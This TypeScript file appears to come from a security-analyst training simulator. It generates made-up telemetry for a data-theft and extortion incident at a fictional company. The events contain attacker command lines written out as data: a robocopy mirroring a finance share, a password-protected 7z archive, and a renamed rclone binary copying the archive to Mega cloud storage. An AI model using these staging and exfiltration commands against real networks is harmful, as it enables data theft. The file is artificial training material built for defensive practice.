/**
 * Events-only half of the ./exfilFirstExtortion.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./exfilFirstExtortion.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { mdeProcess, mdeFile, mdeNetwork, mdeDns } from "@/lib/sim/emitters/mde";
import { panConnection } from "@/lib/sim/emitters/paloalto";
import { winLogon, winShareAccess, domainSidFor } from "@/lib/sim/emitters/windowsSecurity";
import { sentinelAlert } from "@/lib/sim/emitters/sentinel";

/** Telemetry half of `buildExfilFirstExtortionScenario`: the events and the story title, no answer key. */
export function exfilFirstExtortionScenarioEvents() {
  const B = new Date("2026-07-19T01:05:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;
  const HOUR = 3_600_000;

  // NetBIOS names stop at 15 characters and carry no dots: the laptop is domain-joined.
  const host = { hostname: "LT-NX-RDOYLE", ip: "10.20.1.71" };
  const victim = { email: "r.doyle@nexacorp.com", name: "Rhian Doyle", sam: "r.doyle" };
  const deviceId = "c7f2a891d4e34b7fa1082ec9b3d4f716";

  const fileServer = { name: "SRV-NX-FIN01", ip: "10.20.1.25" };
  // Mega storage nodes rclone talks to in parallel (--transfers=8 opens several), plus the API endpoint.
  const megaNode = "gfs301n112.userstorage.mega.co.nz";
  const megaNodeIp = "31.216.148.28";
  const megaApi = { domain: "g.api.mega.co.nz", ip: "31.216.145.5" };
  const megaNode2 = { domain: "gfs302n108.userstorage.mega.co.nz", ip: "31.216.148.31" };
  const megaNode3 = { domain: "gfs270n155.userstorage.mega.co.nz", ip: "31.216.148.44" };
  // The remote-session tool the attacker's interactive session runs through, and its relay.
  const relay = { domain: "relay-3f82a1c0.net.anydesk.com", ip: "195.181.170.44" };

  const robocopyHash = makeSha256("windows_system32_robocopy_exe_signed_microsoft_2026");
  const archiveHash = makeSha256("nexacorp_adobe_arm_cache_7z_portable_2026");
  const rcloneHash = makeSha256("nexacorp_adobe_arm_helper_renamed_rclone_2026");
  const flaggedFileHash = makeSha256("nexacorp_client_holdings_q3_2026_export");
  const anydeskHash = makeSha256("anydesk_exe_remote_support_tool_2026");
  const cmdHash = makeSha256("windows_system32_cmd_exe_signed_microsoft_2026");

  // EDR↔scenario integration (Phase 4): one incident. Endpoint-primary staging →
  // archive → cloud egress on the laptop → edr_scope "edr". The firewall/DLP/SIEM
  // rows are transport and correlation evidence; the renamed rclone binary
  // starting is the alert-grade EDR behavioural detection carrying the exfil crux.
  const INCIDENT = "inc:efe:1";

  const cx = "nexacorp" as const;
  const base = { companyId: cx, host: host.hostname, user: victim.email, srcIp: host.ip, incidentId: INCIDENT } as const;
  const CACHE = "C:\\ProgramData\\Adobe\\ARM\\cache";
  const ANYDESK = "C:\\ProgramData\\AnyDesk\\AnyDesk.exe";
  const SEVEN = `${CACHE}\\7z.exe`;
  const RCLONE = `${CACHE}\\AdobeARMHelper.exe`;
  const userAcct = `NEXACORP\\${victim.sam}`;
  const SHARE_LOGON = "0x4A19C3E";
  const RCLONE_CMD = `AdobeARMHelper.exe copy "${CACHE}\\backup" mega:ClientBackup --config "${CACHE}\\rclone.conf" --transfers=8 --checkers=8 --contimeout=60s --low-level-retries=10`;

  /** The process an EDR network / DNS row belongs to (MDE carries it only as InitiatingProcess*). */
  const proc = (name: string, pid: number, path: string, cmdline: string, parent: string, parentPid: number, hash?: string) => ({
    name, pid, path, cmdline, parent_name: parent, parent_pid: parentPid, user: userAcct, integrity: "medium" as const, ...(hash ? { hash: { sha256: hash } } : {}),
  });
  const anydeskProc = proc("AnyDesk.exe", 3612, ANYDESK, `"${ANYDESK}" --service`, "services.exe", 700, anydeskHash);
  const rcloneProc = proc("AdobeARMHelper.exe", 6301, RCLONE, RCLONE_CMD, "cmd.exe", 5800, rcloneHash);

  const events: TelemetryEvent[] = [
    // 0a. The remote-support tool already on the laptop talks to its relay (DeviceNetworkEvents).
    { ...mdeNetwork({
      ...base, id: "evt_efe_00a_remote_tool_net", ts: T(-8 * MIN - 30 * SEC), remoteIp: relay.ip, remotePort: 443, domain: relay.domain,
      initiatingProcess: "AnyDesk.exe", severity: "medium",
      description: "AnyDesk.exe on LT-NX-RDOYLE opened a TCP/443 connection to an AnyDesk relay at 00:56:30.",
    }), process: anydeskProc },
    // 0b. The firewall's view of the same session.
    panConnection({
      ...base, id: "evt_efe_fw_remote_tool", ts: T(-8 * MIN - 29 * SEC), domain: relay.domain, dstIp: relay.ip, remotePort: 443,
      app: "anydesk", transport: "tcp", action: "allow", category: "remote-access", severity: "medium",
      description: "The firewall logged the AnyDesk session from LT-NX-RDOYLE to the relay at 00:56:31, allowed.",
    }),
    // 0c. An interactive command shell appears in the remote session (explorer.exe → cmd.exe).
    mdeProcess({
      ...base, id: "evt_efe_00c_shell", ts: T(-6 * MIN - 40 * SEC), processName: "cmd.exe", processPath: "C:\\Windows\\System32\\cmd.exe",
      cmdline: "\"C:\\WINDOWS\\system32\\cmd.exe\"", parentName: "explorer.exe", parentPid: 3908, pid: 5800, sha256: cmdHash, integrity: "Medium", signed: true,
      severity: "low", description: "cmd.exe was started from explorer.exe in r.doyle's session at 00:58:20, two minutes after the AnyDesk relay session began.",
    }),
    // 0d-0f. Tooling arrives by file transfer inside the remote session (DeviceFileEvents, written by AnyDesk.exe).
    mdeFile({
      ...base, id: "evt_efe_00d_tool_7z", ts: T(-4 * MIN - 50 * SEC), path: SEVEN, sha256: archiveHash, size: 563_712, action: "file_create",
      initiatingProcess: "AnyDesk.exe", signed: false, severity: "medium",
      description: "AnyDesk.exe wrote 7z.exe into C:\\ProgramData\\Adobe\\ARM\\cache at 01:00:10.",
    }),
    mdeFile({
      ...base, id: "evt_efe_00e_tool_rclone", ts: T(-3 * MIN - 30 * SEC), path: RCLONE, sha256: rcloneHash, size: 63_438_848, action: "file_create",
      initiatingProcess: "AnyDesk.exe", signed: false, severity: "high",
      description: "AnyDesk.exe wrote AdobeARMHelper.exe, 61 MB, into the same folder at 01:01:30.",
    }),
    mdeFile({
      ...base, id: "evt_efe_00f_tool_config", ts: T(-2 * MIN - 45 * SEC), path: `${CACHE}\\rclone.conf`, sha256: null, size: 389, action: "file_create",
      initiatingProcess: "AnyDesk.exe", severity: "medium",
      description: "AnyDesk.exe wrote rclone.conf, 389 bytes, into the same folder at 01:02:15.",
    }),

    // ---------------------------------------------------------------------
    // 1. Local data staging. A recursive copy of the whole finance share
    //    tree into a local cache folder — the shape that matters is the
    //    scope (/E from the share root), not the tool (robocopy is signed
    //    Microsoft software already on every Windows box).
    // ---------------------------------------------------------------------
    mdeProcess({
      ...base, id: "evt_efe_01_staging", ts: T(0), processName: "robocopy.exe", processPath: "C:\\Windows\\System32\\Robocopy.exe",
      cmdline: `robocopy.exe "\\\\${fileServer.name}\\Shares" "${CACHE}\\Shares" /E /Z /R:1 /W:1 /MT:16 /NFL /NDL /NP /XF *.tmp *.log`,
      parentName: "cmd.exe", parentPid: 5800, pid: 6210, sha256: robocopyHash, integrity: "Medium", signed: true,
      mitre: "T1074.001", tactic: "Collection", severity: "medium",
      description: `At 01:05 robocopy.exe mirrored the entire root of \\\\${fileServer.name}\\Shares — every finance and client-records folder on the file server — into a local cache folder on LT-NX-RDOYLE, under r.doyle's own session.`,
    }),
    // 1a. The file server's own view: r.doyle's network logon and the Shares connection, from the laptop.
    winLogon({
      id: "evt_efe_01a_fileserver_logon", ts: T(5 * SEC), companyId: cx, host: fileServer.name, targetUser: victim.sam, userEmail: victim.email,
      logSource: "windows_security", logonType: 3, authPackage: "Kerberos", logonProcess: "Kerberos", srcIp: host.ip, workstation: host.hostname,
      logonId: SHARE_LOGON, severity: "informational", incidentId: INCIDENT,
      description: "4624 on SRV-NX-FIN01: r.doyle logged on over the network (type 3, Kerberos) from 10.20.1.71 at 01:05:05.",
    }),
    { ...winShareAccess({
      id: "evt_efe_01b_fileserver_share", ts: T(6 * SEC), companyId: cx, host: fileServer.name, targetUser: victim.sam, targetSid: domainSidFor(cx, victim.sam),
      userEmail: victim.email, srcIp: host.ip, shareName: "\\\\*\\Shares", shareLocalPath: "\\??\\D:\\Shares", subjectLogonId: SHARE_LOGON,
      severity: "medium", incidentId: INCIDENT,
      description: "5140 on SRV-NX-FIN01: r.doyle connected to the Shares share from 10.20.1.71 at 01:05:06.",
    }), source: "windows_security" as const },
    // 1c. One of the staged files, as the laptop wrote it.
    mdeFile({
      ...base, id: "evt_efe_01c_staged_file", ts: T(40 * SEC), path: `${CACHE}\\Shares\\ClientRecords\\Q3_Client_Holdings_Export.xlsx`, sha256: flaggedFileHash, size: 4_213_760,
      action: "file_create", initiatingProcess: "robocopy.exe", severity: "low",
      description: "robocopy.exe wrote Q3_Client_Holdings_Export.xlsx into the staging folder at 01:05:40.",
    }),

    // ---------------------------------------------------------------------
    // 2. Archive via utility. A portable, unsigned 7z.exe (7-Zip does not
    //    ship code-signed even legitimately, which is why "unsigned" alone
    //    is not the tell here) builds a password-protected, header-encrypted
    //    multi-volume archive from the staged copy.
    // ---------------------------------------------------------------------
    mdeProcess({
      ...base, id: "evt_efe_02_archive", ts: T(9 * MIN), processName: "7z.exe", processPath: SEVEN,
      cmdline: `7z.exe a -v2000m -mx1 -mhe=on -pR3c0veryK3y! "${CACHE}\\backup\\backup_2026_07.7z" "${CACHE}\\Shares\\*" -r`,
      parentName: "cmd.exe", parentPid: 5800, pid: 6244, sha256: archiveHash, integrity: "Medium", signed: false,
      mitre: "T1560.001", tactic: "Collection", severity: "medium",
      description: "At 01:14 a portable 7z.exe sitting in the same cache folder — not a path any NexaCorp software-distribution record installed — built a password-protected, header-encrypted archive from everything robocopy had just staged, split into 2 GB volumes.",
    }),
    // 2a. Archive volumes as 7z.exe writes them: 18 full 2,000 MB volumes and a final partial one.
    mdeFile({
      ...base, id: "evt_efe_02a_volume_001", ts: T(9 * MIN + 20 * SEC), path: `${CACHE}\\backup\\backup_2026_07.7z.001`, sha256: null, size: 2_097_152_000,
      action: "file_create", initiatingProcess: "7z.exe", initiatingCmdline: "7z.exe a -v2000m -mx1 -mhe=on", severity: "low",
      description: "7z.exe created the first 2,000 MB volume, backup_2026_07.7z.001, at 01:14:20.",
    }),
    // 3. Purview Endpoint DLP sees the archiver touch labeled files while
    //    the archive is being built — and logs it, because the matching
    //    rule's configured action is Audit, not Block. This is the gap.
    {
      id: "evt_efe_03_dlp_audit",
      ts: T(10 * MIN),
      source: "dlp",
      vendor: "Microsoft Purview",
      event_type: "dlp_alert",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1074.001",
      mitre_tactic: "Collection",
      description:
        "Microsoft Purview Endpoint DLP matched 1,847 instances of sensitivity-labeled client financial data being read by an unallowed application (7z.exe) on LT-NX-RDOYLE. The matching rule is enforced, but its configured actions are Audit and NotifyUser — the activity was logged and the user notified, and nothing was blocked.",
      file: {
        name: "Q3_Client_Holdings_Export.xlsx",
        path: `${CACHE}\\Shares\\ClientRecords\\Q3_Client_Holdings_Export.xlsx`,
        extension: "xlsx",
        size: 4_213_760,
        sha256: flaggedFileHash,
      },
      raw: {
        "data.office365.RecordType": "63",
        "data.office365.Operation": "DlpRuleMatch",
        "data.office365.Workload": "Endpoint",
        "data.office365.UserId": victim.email,
        "data.office365.ObjectId": `${CACHE}\\Shares\\ClientRecords\\Q3_Client_Holdings_Export.xlsx`,
        "data.office365.IncidentId": "5192044",
        "data.office365.PolicyDetails.PolicyName": "NexaCorp — Client Data: Restricted App Access",
        "data.office365.PolicyDetails.Rules.RuleName": "Audit unallowed app activity on labeled client files",
        "data.office365.PolicyDetails.Rules.RuleMode": "Enforce",
        "data.office365.PolicyDetails.Rules.Severity": "High",
        "data.office365.PolicyDetails.Rules.Actions": ["Audit", "NotifyUser"],
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.SensitiveInformationTypeName": "IBAN",
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.Count": "1847",
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.Confidence": "90",
        "data.office365.PolicyDetails.Rules.ConditionsMatched.SensitiveInformation.ClassifierType": "PatternMatch",
        "data.office365.EndpointMetaData.Application": "7z.exe",
        "data.office365.EndpointMetaData.DeviceName": host.hostname,
        "data.office365.EndpointMetaData.FileName": "Q3_Client_Holdings_Export.xlsx",
        "data.office365.DeviceId": deviceId,
        "data.office365.DeviceDisplayName": host.hostname,
        "data.office365.ClientProcessName": "7z.exe",
      },
    },
    mdeFile({
      ...base, id: "evt_efe_03a_volume_018", ts: T(22 * MIN + 50 * SEC), path: `${CACHE}\\backup\\backup_2026_07.7z.018`, sha256: null, size: 2_097_152_000,
      action: "file_create", initiatingProcess: "7z.exe", initiatingCmdline: "7z.exe a -v2000m -mx1 -mhe=on", severity: "low",
      description: "7z.exe created backup_2026_07.7z.018 at 01:27:50.",
    }),
    mdeFile({
      ...base, id: "evt_efe_03b_volume_019", ts: T(23 * MIN + 40 * SEC), path: `${CACHE}\\backup\\backup_2026_07.7z.019`, sha256: null, size: 745_264_000,
      action: "file_create", initiatingProcess: "7z.exe", initiatingCmdline: "7z.exe a -v2000m -mx1 -mhe=on", severity: "low",
      description: "7z.exe created the final, partial volume backup_2026_07.7z.019 (711 MB) at 01:28:40. The 19 volumes total 38.5 GB.",
    }),

    // ---------------------------------------------------------------------
    // 4. The exfiltration tool. A renamed rclone binary, config pointed at
    //    an external cloud remote — the process event that shows intent,
    //    before any bytes have actually moved.
    // ---------------------------------------------------------------------
    mdeProcess({
      ...base, id: "evt_efe_04_exfil_tool", ts: T(24 * MIN), processName: "AdobeARMHelper.exe", processPath: RCLONE,
      cmdline: RCLONE_CMD, parentName: "cmd.exe", parentPid: 5800, pid: 6301, sha256: rcloneHash, integrity: "Medium", signed: false,
      mitre: "T1567.002", // Exfiltration to Cloud Storage — rclone copy to a 'mega' remote (Q1 cites evt_efe_04 as T1567.002)
      tactic: "Exfiltration",
      isDetection: true, // alert-grade: the highest-severity EDR behavioural detection — a renamed rclone binary staged to exfiltrate the archive to cloud storage (the crux)
      severity: "high",
      description: "At 01:29 a binary named AdobeARMHelper.exe — sitting in the same cache folder, not the real Adobe update path — started with an rclone-style command line copying the local archive to a remote named 'mega', using a config file dropped alongside it.",
    }),
    // 4a. rclone resolves the Mega API and the storage nodes it will upload to.
    ...([
      ["evt_efe_04a_dns_api", 5 * SEC, megaApi],
      ["evt_efe_04b_dns_node1", 12 * SEC, { domain: megaNode, ip: megaNodeIp }],
      ["evt_efe_04c_dns_node2", 14 * SEC, megaNode2],
      ["evt_efe_04d_dns_node3", 16 * SEC, megaNode3],
    ] as const).map(([id, off, d]) => ({
      ...mdeDns({ ...base, id, ts: T(24 * MIN + off), domain: d.domain, resolvedIp: d.ip, severity: "medium",
        description: `AdobeARMHelper.exe resolved ${d.domain}.` }),
      process: rcloneProc,
    })),

    // ---------------------------------------------------------------------
    // 5. Sessions open. Allowed — the destination is a legitimate,
    //    widely-used consumer cloud-storage provider, not a blocklisted
    //    domain.
    // ---------------------------------------------------------------------
    panConnection({
      ...base, id: "evt_efe_05_session_start", ts: T(24 * MIN + 15 * SEC), domain: megaNode, dstIp: megaNodeIp, remotePort: 443,
      app: "mega", transport: "tcp", action: "allow", category: "online-storage-and-backup", severity: "medium",
      description: "Fifteen seconds after AdobeARMHelper.exe started, LT-NX-RDOYLE opened a TLS session to gfs301n112.userstorage.mega.co.nz, allowed under the category online-storage-and-backup.",
    }),
    panConnection({
      ...base, id: "evt_efe_fw_session2_start", ts: T(24 * MIN + 18 * SEC), domain: megaNode2.domain, dstIp: megaNode2.ip, remotePort: 443,
      app: "mega", transport: "tcp", action: "allow", category: "online-storage-and-backup", severity: "medium",
      description: "A second TLS session opened to gfs302n108.userstorage.mega.co.nz, allowed under the same category.",
    }),
    panConnection({
      ...base, id: "evt_efe_fw_session3_start", ts: T(24 * MIN + 21 * SEC), domain: megaNode3.domain, dstIp: megaNode3.ip, remotePort: 443,
      app: "mega", transport: "tcp", action: "allow", category: "online-storage-and-backup", severity: "medium",
      description: "A third TLS session opened to gfs270n155.userstorage.mega.co.nz, allowed under the same category.",
    }),

    // ---------------------------------------------------------------------
    // 6. Sessions close. Same allow, same category — three parallel uploads that
    //    together moved 39,648,512,000 bytes (the sum of the three sent counters).
    // ---------------------------------------------------------------------
    panConnection({
      ...base, id: "evt_efe_fw_session3_end", ts: T(58 * MIN + 20 * SEC), domain: megaNode3.domain, dstIp: megaNode3.ip, remotePort: 443,
      app: "mega", transport: "tcp", action: "allow", end: true, category: "online-storage-and-backup",
      bytesOut: 12_348_512_000, bytesIn: 512_000, elapsedSec: 2039, severity: "high",
      description: "The third Mega session closed at 02:03:20 after sending 12.3 GB.",
    }),
    panConnection({
      ...base, id: "evt_efe_fw_session2_end", ts: T(59 * MIN + 2 * SEC), domain: megaNode2.domain, dstIp: megaNode2.ip, remotePort: 443,
      app: "mega", transport: "tcp", action: "allow", end: true, category: "online-storage-and-backup",
      bytesOut: 13_100_000_000, bytesIn: 655_360, elapsedSec: 2084, severity: "high",
      description: "The second Mega session closed at 02:04:02 after sending 13.1 GB.",
    }),
    panConnection({
      ...base, id: "evt_efe_06_session_end", ts: T(59 * MIN + 15 * SEC), domain: megaNode, dstIp: megaNodeIp, remotePort: 443,
      app: "mega", transport: "tcp", action: "allow", end: true, category: "online-storage-and-backup",
      bytesOut: 14_200_000_000, bytesIn: 778_240, elapsedSec: 2100, mitre: "T1567.002", tactic: "Exfiltration", severity: "critical",
      description: "The first Mega session closed at 02:04:15 after exactly 35 minutes, having sent 14.2 GB — the largest of three parallel uploads that together sent 39.6 GB and received under 2 MB.",
    }),

    // ---------------------------------------------------------------------
    // 7. Sentinel correlation. Three independently-generated sources
    //    joined into one incident.
    // ---------------------------------------------------------------------
    sentinelAlert({
      ...base, id: "evt_efe_07_correlation", ts: T(60 * MIN), alertName: "SustainedCloudEgressFollowingLocalDataStaging",
      ruleId: "SEN-EXFIL-0143", severity: "high", eventType: "ueba_anomaly", tactic: "Exfiltration",
      fullName: victim.name, department: "Finance Operations", title: "Finance Operations Manager",
      extendedProperties: {
        "Total Bytes Transferred": "39648512000",
        "Destination Category": "online-storage-and-backup",
      },
      description:
        "Sentinel correlated three independent signals into a single incident: local staging, archive creation, and sustained cloud egress from LT-NX-RDOYLE overnight.",
    }),

    // ---------------------------------------------------------------------
    // 8. The extortion contact reaches the security mailbox (Defender for Office 365 EmailEvents).
    // ---------------------------------------------------------------------
    {
      id: "evt_efe_08a_extortion_email", ts: T(2 * HOUR + 33 * MIN), source: "email_gateway", vendor: "Microsoft Defender for Office 365",
      event_type: "email_received", severity: "high", user_email: "security@nexacorp.com", incident_id: INCIDENT,
      description: "An external sender delivered a message to security@nexacorp.com at 03:38 referencing a volume of NexaCorp client records and linking to a leak-site address.",
      raw: {
        "email.from.address": "recovery.desk@proton.me",
        "email.from.display_name": "Data Recovery Desk",
        "email.to.address": "security@nexacorp.com",
        "email.subject": "Your client data is in our possession - 39 GB",
        "email.direction": "inbound",
        "email.message_id": "<7f3a91c2-4e0b-4d6a-9b15-2c8e0d7a43f1@proton.me>",
        "email.url": "http://kz7w4nq2lbd5xkq3vj6r2yhm4tz7p3c5dfa2gwlo6ebb5xysu4kzidqd.onion/n/client-records",
        "email.spf": "pass",
        "email.dkim": "pass",
        "email.dmarc": "pass",
      },
    },
    // 8. Hours later: the Sentinel incident is escalated on the strength of that mail.
    {
      id: "evt_efe_08_extortion_incident",
      ts: T(2 * HOUR + 35 * MIN),
      source: "siem",
      vendor: "Microsoft Sentinel",
      event_type: "risk_score_change",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      description:
        "The Sentinel incident tied to LT-NX-RDOYLE was escalated from High to Critical after NexaCorp's security mailbox received a data-extortion message at 03:38 referencing a volume of client records consistent with the archive staged and transferred overnight. No encryption, ransom note, or file-rename activity has been found on the host, the file shares, or anywhere else in the environment.",
      raw: {
        "sentinel.incident.IncidentNumber": "41207",
        "sentinel.incident.Title": "Sustained cloud egress following local data staging — LT-NX-RDOYLE",
        "sentinel.incident.Severity": "Critical",
        "sentinel.incident.PreviousSeverity": "High",
        "sentinel.incident.Status": "Active",
        "sentinel.incident.Classification": "",
        "sentinel.incident.Owner.assignedTo": "soc-tier2@nexacorp.com",
        "sentinel.incident.AdditionalData.alertsCount": "3",
        "sentinel.incident.Comments": [
          {
            message:
              "IT Security received a data-extortion email at security@nexacorp.com at 03:38 UTC referencing a volume of data consistent with the archive staged and transferred from LT-NX-RDOYLE overnight. No encryption, file-rename, or ransom-note artifacts have been found on the host or on the shares it touched.",
            author: "soc-tier2@nexacorp.com",
            createdTimeUtc: T(2 * HOUR + 35 * MIN),
          },
        ],
        "host.name": host.hostname,
        "host.ip": host.ip,
        "target.user.name": `NEXACORP\\${victim.sam}`,
        "event.action": "incident-updated",
        "event.outcome": "escalated",
      },
    },
  ];

  // A start record and its end record are one session: the same authored session id correlates them.
  const sessionOf: Record<string, string> = {
    evt_efe_05_session_start: "981204", evt_efe_06_session_end: "981204",
    evt_efe_fw_session2_start: "981205", evt_efe_fw_session2_end: "981205",
    evt_efe_fw_session3_start: "981206", evt_efe_fw_session3_end: "981206",
  };
  for (const e of events) if (sessionOf[e.id]) e.raw["pan.session_id"] = sessionOf[e.id];

  // Chronological order is the contract (the integrity gate): sort by time, stable.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));
  // Every event belongs to the one incident.
  for (const e of events) e.incident_id = INCIDENT;

  return { title: "Threatening email to NexaCorp's security mailbox", events, T, MIN, SEC, HOUR, host, victim, fileServer, megaNode, megaNodeIp, archiveHash, rcloneHash, flaggedFileHash, relay };
}
